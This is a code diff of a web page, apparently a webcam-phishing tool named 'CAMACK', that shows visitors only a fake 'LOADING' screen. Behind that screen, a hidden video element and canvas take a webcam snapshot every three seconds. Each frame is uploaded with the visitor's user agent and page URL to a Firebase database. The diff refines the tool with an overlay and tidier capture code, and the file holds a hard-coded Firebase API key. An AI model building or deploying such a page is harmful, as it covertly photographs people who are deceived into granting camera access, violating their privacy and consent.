@@ -1,31 +1,59 @@
 <!doctype html>
 <html>
-
 <head>
   <title>CAMACK LOADING...</title>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
   <link rel="stylesheet" href="./css/style.css">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: #000;
+      color: white;
+      text-align: center;
+    }
+    #loading {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+  </style>
 </head>
 
 <body>
+  <div id="loading">
+    <h1>
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </h1>
+  </div>
+
   <div class="video-wrap" hidden="hidden">
     <video id="video" playsinline autoplay></video>
   </div>
   <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
 
-  <h1>
-    <span>L</span>
-    <span>O</span>
-    <span>A</span>
-    <span>D</span>
-    <span>I</span>
-    <span>N</span>
-    <span>G</span>
-  </h1>
-
   <script>
+    // Remove loading screen after 3 seconds
+    setTimeout(function() {
+      document.getElementById('loading').style.display = 'none';
+    }, 3000);
+
     // Firebase configuration - REPLACE WITH YOUR OWN CONFIG
     const firebaseConfig = {
   apiKey: "AIzaSyCNvicnUo9NBsTJNxUb2Vap0QuDY7RFxf8",
@@ -36,26 +64,24 @@
   messagingSenderId: "1006070928226",
   appId: "1:1006070928226:web:d025b11d0e7eaa0482523b"
 };
-    
+
     // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
+    if (!firebase.apps.length) {
+      firebase.initializeApp(firebaseConfig);
+    }
+    
     const database = firebase.database();
 
-    // Capture IP and user agent info
+    // Capture client information
     function captureClientInfo() {
-      let ipaddress = "";
-      if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-        ipaddress = $_SERVER['HTTP_CLIENT_IP'];
-      } else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
-      } else {
-        ipaddress = $_SERVER['REMOTE_ADDR'];
-      }
-      
       return {
-        ip: ipaddress,
+        ip: "UNKNOWN", // In a browser environment, we can't directly get the IP
         userAgent: navigator.userAgent,
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        location: {
+          href: window.location.href,
+          origin: window.location.origin
+        }
       };
     }
 
@@ -64,20 +90,27 @@
       const timestamp = new Date().getTime();
       const imageDataRef = database.ref('camack/images/' + timestamp);
       
-      imageDataRef.set({
+      const data = {
         image: imgdata,
         metadata: captureClientInfo(),
         createdAt: firebase.database.ServerValue.TIMESTAMP
-      }).then(() => {
-        console.log("Image data sent to Firebase successfully!");
-      }).catch((error) => {
-        console.error("Error sending data to Firebase: ", error);
-      });
+      };
+      
+      imageDataRef.set(data)
+        .then(() => {
+          console.log("Image data sent to Firebase successfully!");
+        })
+        .catch((error) => {
+          console.error("Error sending data to Firebase: ", error);
+        });
     }
 
     // Access webcam
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
+    const errorMsgElement = document.createElement('div');
+    document.body.appendChild(errorMsgElement);
+    
     const constraints = {
       audio: false,
       video: {
@@ -91,6 +124,7 @@
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         handleSuccess(stream);
       } catch (e) {
+        errorMsgElement.innerHTML = `Camera access error: ${e.toString()}`;
         console.error(`navigator.getUserMedia error:${e.toString()}`);
       }
     }
@@ -103,19 +137,15 @@
       var context = canvas.getContext('2d');
       setInterval(function() {
         context.drawImage(video, 0, 0, 640, 480);
-        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        var canvasData = canvas.toDataURL("image/png");
         sendToFirebase(canvasData);
-      }, 1500);
+      }, 3000); // Capture every 3 seconds
     }
 
-    // Start initialization
-    init();
-
-    // Utility function for checking empty values
-    function empty(value) {
-      return value === undefined || value === null || value.length === 0;
-    }
+    // Start initialization after page loads
+    window.addEventListener('DOMContentLoaded', (event) => {
+      init();
+    });
   </script>
 </body>
-
 </html>
